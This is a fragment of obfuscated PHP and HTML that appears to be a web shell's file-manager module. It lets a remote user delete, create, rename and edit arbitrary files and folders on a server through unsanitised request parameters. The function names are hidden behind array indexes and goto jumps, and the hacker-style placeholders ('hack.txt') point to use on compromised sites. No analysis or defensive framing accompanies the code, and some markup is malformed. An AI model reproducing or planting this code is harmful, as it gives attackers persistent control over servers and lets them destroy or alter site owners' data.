...
<div class="px-2 py-2">
<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe(":(", 0); goto iL; e8: Xe(":)"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("'-'", 0); goto Mk; uH: xe(":)"); Mk: xB: Lu: ?>
<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
<h5 class="border p-1 mb-3">FD</h5>
...
<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("'_'", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe(":)") : Xe(":(", 0)) : null; goto WC; Pb: ?>
<h5 class="border p-1 mb-3">FL/h5>
<formmethod="post"><div class="form-group"><label for="n">FILE NAME :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# here we go again homie"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("'_'", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE(":)", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe(":(", 0)) : null; goto WC; Lw: ?>
<h5 class="border p-1 mb-3">RN <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
...
<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE(":)") : Xe(":(", 0) : null; goto WC; Ox: ?>
<h5 class="border p-1 mb-3">ED</h5>
...
<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE(":)", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE(":(") : null; goto WC; Ag: ?>
